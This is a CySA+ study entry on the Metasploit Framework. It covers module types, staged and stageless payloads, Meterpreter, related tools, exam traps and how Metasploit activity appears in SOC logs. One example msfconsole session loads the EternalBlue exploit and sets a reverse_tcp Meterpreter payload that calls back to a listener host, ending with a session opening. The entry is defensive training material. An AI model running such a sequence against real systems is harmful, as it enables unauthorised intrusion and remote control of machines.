# MSF — Metasploit Framework

## What it is

In **Metal Gear Solid**, when Otacon hands Snake the Nikita launcher, he doesn't just give him a missile — he gives him a steerable platform. Same warhead, same propellant, but Snake can pilot it around corners, through vents, into rooms a straight shot could never reach. The weapon is modular: the launcher is the framework, the missile is the payload, and the guidance is the operator's choice mid-flight. That's exactly what Metasploit Framework does — it separates the exploit (the way in) from the payload (what runs once you're in) from the encoder (how you slip past the guards), and lets the operator wire them together for the target in front of them.

**Metasploit Framework (MSF)** is an open-source penetration testing platform maintained by Rapid7. It's a modular exploit development and execution environment: a library of exploits, payloads, encoders, post-exploitation modules, and auxiliary scanners, all driven from a console (`msfconsole`) or scripted via Ruby. CySA+ tests MSF as a **multipurpose offensive tool** under Objective 2.2 — you need to recognize its output, understand what red team or attacker activity looks like in your logs, and know its place alongside Nmap, Burp, ZAP, and the vulnerability scanner stack.

## Why it matters

You will not be writing zero-days on day one of your SOC job. But you will absolutely see Metasploit traffic — from your own red team during purple-team exercises, from pentest engagements your company paid for, and from real attackers using leaked or commodity modules. **Meterpreter** sessions, **reverse_tcp** callbacks, the default `Metasploit` user-agent string on unencoded HTTP modules — these are recognizable in logs if you know what to look for.

CySA+ Objective 2.2 lumps MSF with the "multipurpose" tools because it does reconnaissance, exploitation, and post-exploitation in one shell. The exam will hand you a snippet of `msfconsole` output and ask what's happening, what module class it is, or what an analyst should do next. You need to read it without flinching.

The deeper career reason: every senior SOC analyst eventually has to think like the attacker. MSF is the lingua franca of offensive ops. When the IR lead says "they pivoted with a Meterpreter session," you need to know what that sentence means without slowing the bridge call down.

## Key facts

### Module taxonomy

MSF organizes everything as **modules**, loaded under `/usr/share/metasploit-framework/modules/` (or wherever the install lives). Six categories matter:

| Module class | What it does | Example |
|---|---|---|
| **Exploit** | Triggers a vulnerability to gain code execution | `exploit/windows/smb/ms17_010_eternalblue` |
| **Payload** | The code that runs after the exploit lands | `windows/x64/meterpreter/reverse_tcp` |
| **Auxiliary** | Scanners, fuzzers, DoS, login bruteforcers (no shell) | `auxiliary/scanner/smb/smb_version` |
| **Post** | Run inside an existing session (privesc, lateral, loot) | `post/windows/gather/hashdump` |
| **Encoder** | Obfuscates payload bytes to evade signature AV | `x86/shikata_ga_nai` |
| **Nops** | NOP-sled generators for buffer overflow alignment | `x86/single_byte` |

The exam loves the exploit/payload/auxiliary distinction. **Auxiliary modules do not exploit** — they enumerate, scan, brute, or harass. If the question shows port scanning or SMB version detection inside `msfconsole`, that's auxiliary.

### Payload types — staged vs stageless

This is a tested distinction.

- **Staged payload** (`/`) — tiny initial stager calls back to MSF, downloads the full payload (the "stage") over the socket, then executes it. Example: `windows/meterpreter/reverse_tcp`. Smaller initial footprint, two-step delivery, visible on the wire as a follow-up download.
- **Stageless payload** (`_`) — entire payload delivered in one shot. Example: `windows/meterpreter_reverse_tcp` (note the underscore). Larger, one-step, no second connection.

On the wire, staged Meterpreter has a recognizable handshake: small initial connection, then a chunk of binary download right behind it.

### Meterpreter

The crown jewel payload. **Meterpreter** is an in-memory, DLL-injected payload that gives the operator an interactive command channel without dropping a binary to disk. It speaks a custom protocol (TLV — type-length-value), supports channels for file transfer / shell / port forwarding, and runs natively in the compromised process's memory space. From a defender's view: **suspicious child processes injected with no on-disk artifact, encrypted callback traffic on odd ports, often masquerading as HTTPS**.

### Common workflow inside `msfconsole`

```
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(...) > set RHOSTS 10.10.10.50
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 10.10.14.5
msf6 exploit(...) > run
[*] Started reverse TCP handler on 10.10.14.5:4444
[*] 10.10.10.50:445 - Connecting to target for exploitation.
[+] 10.10.10.50:445 - Target is vulnerable.
[*] Sending stage (200774 bytes) to 10.10.10.50
[*] Meterpreter session 1 opened
```

Recognize the verbs: `use`, `set`, `show options`, `run` / `exploit`, `sessions -i`, `background`. The `[+]` is a hit. The `[*]` is informational. The `[-]` is a failure. CySA+ will test your ability to read this output and identify (a) what's being attacked, (b) what payload landed, (c) what the analyst should do.

### Where MSF fits alongside the other 2.2 tools

| Tool | Purpose | Notes for the exam |
|---|---|---|
| **[[Nmap]]** | Network scanning, port discovery, service version, OS fingerprinting | The first tool. NSE scripts add light vuln checks. |
| **Angry IP Scanner** | Lightweight cross-platform IP/port sweeper | Faster than Nmap for simple liveness; less depth. |
| **MSF** | Exploit + payload + post-ex framework | Multipurpose. Has scanners but exploitation is the point. |
| **[[Nessus]]** | Commercial vulnerability scanner (Tenable) | Credentialed scans, CVSS-scored reports. |
| **[[OpenVAS]]** | Open-source vulnerability scanner (Greenbone) | Nessus alternative. |
| **[[Nikto]]** | Web server vulnerability scanner | Noisy, signature-based, hits `/cgi-bin/` and known bad paths. |
| **[[Burp Suite]]** | Web app proxy + scanner | Intercepting proxy. Manual + automated web testing. |
| **[[OWASP ZAP]]** | Open-source web app proxy | Burp alternative. |
| **Arachni** | Web application scanner | Older, Ruby-based, less common in 2026 ops. |
| **[[Recon-ng]]** | OSINT framework, Metasploit-style modules | Passive recon. Pulls from APIs, search engines, breach data. |
| **[[Maltego]]** | OSINT link-analysis GUI | Visual graphs of entities and relationships. |
| **Scout Suite** | Multi-cloud security auditing (AWS, Azure, GCP) | Read-only cloud posture assessment. |
| **Prowler** | AWS (and now multi-cloud) security audit, CIS-benchmark aligned | Heavy on AWS IAM, S3, CloudTrail checks. |
| **[[Pacu]]** | AWS exploitation framework — Rapid7-style for cloud | Think MSF, but for AWS misconfigs. |
| **Immunity Debugger** | Windows userland debugger, Python-scriptable | Exploit dev. |
| **[[GDB]]** | The Linux debugger | Exploit dev, RE, crash analysis. |

MSF, Pacu, and Recon-ng share the "modular framework with a console" feel — if a question shows a `use module/...; set OPTION; run` pattern, it's one of those three. Context tells you which (cloud, OSINT, or exploitation).

### CompTIA exam traps

> **CompTIA exam trap:** MSF is not a vulnerability scanner. It can scan, but its purpose is exploitation. If the question asks for a tool to *identify* vulnerabilities for a remediation report, the answer is Nessus / OpenVAS / Qualys — not Metasploit. MSF *validates* vulnerabilities by exploiting them; that's a different job.

> **CompTIA exam trap:** Meterpreter ≠ a shell. A `cmd.exe` reverse shell is a TCP socket bound to a command interpreter. Meterpreter is an in-memory payload speaking a custom protocol with channels, scripting, and pivoting. The exam will try to use them as synonyms — they aren't.

> **CompTIA exam trap:** Staged vs stageless is signaled by the slash. `meterpreter/reverse_tcp` is staged (two-stage). `meterpreter_reverse_tcp` is stageless (one shot). Easy to misread under exam pressure.

> **CompTIA exam trap:** MSF auxiliary modules can do unauthenticated scanning, login bruteforcing, and DoS — without ever popping a shell. If the output shows `auxiliary/scanner/...` and a list of valid SMB versions, no exploitation happened. The analyst is still in recon.

## SOC reality

- **What you actually see in logs:** unexpected outbound TCP connections to high ports (4444, 8080, 443 if the operator is smart), short-lived connections with binary payloads, encoded PowerShell spawning from Office processes, `rundll32.exe` or `svchost.exe` making external calls. Meterpreter over HTTPS hides inside legitimate-looking 443 traffic — EDR behavior analytics catch it more reliably than network signatures.
- **First L1 action on a Meterpreter alert:** validate it's not your own red team. Half the "Meterpreter detected" tickets in any mature SOC are scheduled pentests nobody told the L1 about. Check the engagement calendar before you isolate the host. *I learned this the hard way after pulling a CFO's laptop off the network during a sanctioned phish exercise.*
- **What the IR lead asks:** "Source IP of the callback? Is it inside our authorized pentest scope? What process is the implant living in? Memory captured before we isolate?" If it's not the red team, you preserve volatile memory **first** — Meterpreter is in-memory only, and rebooting the host destroys the evidence.
- **Never promise leadership:** "the exploit failed" just because MSF returned `[-] Exploit aborted`. The operator may have already pivoted, set persistence, and moved laterally. The framework's error message reflects one module's outcome, not the campaign's.
- **Handoff:** L1 confirms scope and validates the alert isn't authorized testing → L2 pulls memory and packet capture → IR team owns scope, persistence hunt, and lateral movement assessment → threat intel correlates TTPs against known actors using commodity MSF.

## Related concepts

[[Nmap]] · [[Nessus]] · [[OpenVAS]] · [[Burp Suite]] · [[OWASP ZAP]] · [[Nikto]] · [[Recon-ng]] · [[Maltego]] · [[Pacu]] · [[GDB]] · [[Penetration Testing]] · [[Cyber Kill Chain]] · [[MITRE ATT&CK]] · [[Indicators of Compromise]] · [[Endpoint Detection and Response]] · [[Memory Forensics]] · [[Reverse Shell]] · [[Living Off The Land Binaries]]

*Source: VIRGIL knowledge base — 2026-05-11*